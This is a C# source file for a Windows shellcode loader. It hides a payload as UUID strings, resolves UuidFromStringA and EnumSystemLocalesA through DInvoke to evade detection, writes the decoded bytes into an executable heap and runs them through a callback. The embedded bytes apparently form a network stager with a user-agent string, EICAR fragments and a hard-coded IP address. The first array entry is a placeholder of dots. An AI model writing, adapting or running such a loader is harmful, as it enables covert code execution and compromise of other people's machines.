using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using DInvoke;

namespace UuidShellcode
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize);

        [DllImport("kernel32.dll", SetLastError = false)] static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwBytes);
        static void Main(string[] args)
        {
            var HeapCreateHandle = HeapCreate((uint)0x00040000, UIntPtr.Zero, UIntPtr.Zero);
            var heapAddr = HeapAlloc(HeapCreateHandle, (uint)0, (uint)0x100000);

            string[] uuids =
{           ".....................","d2314856-4865-528b-6048-8b5218488b52","728b4820-4850-b70f-4a4a-4d31c94831c0","7c613cac-2c02-4120-c1c9-0d4101c1e2ed","48514152-528b-8b20-423c-4801d0668178","75020b18-8b72-8880-0000-004885c07467","50d00148-488b-4418-8b40-204901d0e356","41c9ff48-348b-4888-01d6-4d31c94831c0","c9c141ac-410d-c101-38e0-75f14c034c24","d1394508-d875-4458-8b40-244901d06641","44480c8b-408b-491c-01d0-418b04884801","415841d0-5e58-5a59-4158-4159415a4883","524120ec-e0ff-4158-595a-488b12e94fff","6a5dffff-4900-77be-696e-696e65740041","e6894956-894c-41f1-ba4c-772607ffd548","3148c931-4dd2-c031-4d31-c94150415041","79563aba-ffa7-ebd5-735a-4889c141b878","4d000003-c931-5141-4151-6a03415141ba","c69f8957-d5ff-59eb-5b48-89c14831d249","314dd889-52c9-0068-0240-84525241baeb","ff3b2e55-48d5-c689-4883-c3506a0a5f48","8948f189-49da-c0c7-ffff-ffff4d31c952","2dba4152-1806-ff7b-d585-c00f859d0100","cfff4800-840f-018c-0000-ebd3e9e40100","ffa2e800-ffff-502f-627a-3100354f2150","50414025-345b-505c-5a58-353428505e29","29434337-7d37-4524-4943-41522d535441","5241444e-2d44-4e41-5449-56495255532d","54534554-462d-4c49-4521-24482b482a00","50214f35-0025-7355-6572-2d4167656e74","6f4d203a-697a-6c6c-612f-352e30202863","61706d6f-6974-6c62-653b-204d53494520","3b302e39-5720-6e69-646f-7773204e5420","3b312e36-5720-574f-3634-3b2054726964","2f746e65-2e35-2930-0d0a-486f73743a20","6c6c756e-0a0d-3500-4f21-50254041505b","5a505c34-3558-2834-505e-293743432937","4945247d-4143-2d52-5354-414e44415244","544e412d-5649-5249-5553-2d544553542d","454c4946-2421-2b48-482a-00354f215025","5b504140-5c34-5a50-5835-3428505e2937","37294343-247d-4945-4341-522d5354414e","44524144-412d-544e-4956-495255532d54","2d545345-4946-454c-2124-482b482a0035","2550214f-4140-5b50-345c-505a58353428","37295e50-4343-3729-7d24-45494341522d","4e415453-4144-4452-2d41-4e5449564952","542d5355-5345-2d54-4649-4c452124482b","35002a48-004f-be41-f0b5-a256ffd54831","0000bac9-0040-b841-0010-000041b94000","ba410000-a458-e553-ffd5-489353534889","f18948e7-8948-41da-b800-2000004989f9","9612ba41-e289-d5ff-4883-c42085c074b6","48078b66-c301-c085-75d7-585858480500","50000000-e8c3-fd9f-ffff-34372e313033","2e35382e-3137-0000-0000-003535333264",

            };

            IntPtr pkernel32 = DInvoke.DynamicInvoke.Generic.GetPebLdrModuleEntry("kernel32.dll");
            IntPtr prpcrt4 = DInvoke.DynamicInvoke.Generic.GetPebLdrModuleEntry("rpcrt4.dll");
            IntPtr pEnumSystemLocalesA = DInvoke.DynamicInvoke.Generic.GetExportAddress(pkernel32, "EnumSystemLocalesA");
            IntPtr pUuidFromStringA = DInvoke.DynamicInvoke.Generic.GetExportAddress(prpcrt4, "UuidFromStringA");

            IntPtr newHeapAddr = IntPtr.Zero;
            for (int i = 0; i < uuids.Length; i++)
            {
                newHeapAddr = IntPtr.Add(HeapCreateHandle, 16 * i);
                object[] uuidFromStringAParam = { uuids[i], newHeapAddr };
                var status = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pUuidFromStringA, typeof(DELEGATE.UuidFromStringA), ref uuidFromStringAParam);
            }

            object[] enumSystemLocalesAParam = { HeapCreateHandle, 0 };
            var result = DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pEnumSystemLocalesA, typeof(DELEGATE.EnumSystemLocalesA), ref enumSystemLocalesAParam);
        }
    }
    public class DELEGATE
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr UuidFromStringA(string StringUuid, IntPtr heapPointer);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool EnumSystemLocalesA(IntPtr lpLocaleEnumProc, int dwFlags);
    }
}
